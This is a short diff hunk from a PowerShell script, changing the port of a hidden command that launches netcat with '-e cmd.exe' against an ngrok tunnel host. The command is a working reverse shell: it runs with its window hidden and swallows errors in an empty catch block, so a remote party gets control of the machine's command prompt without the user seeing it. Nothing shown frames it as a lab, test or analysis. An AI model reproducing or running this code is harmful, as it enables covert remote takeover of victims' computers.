@@ -17,7 +17,7 @@ try {
 
 try {
     $WshShell = New-Object -ComObject WScript.Shell
-    $WshShell.Run("`"$NcPath`" 0.tcp.in.ngrok.io 18378 -e cmd.exe", 0, $false)
+    $WshShell.Run("`"$NcPath`" 0.tcp.in.ngrok.io 15336 -e cmd.exe", 0, $false)
 } catch {}
 
 Start-Sleep -Seconds 5
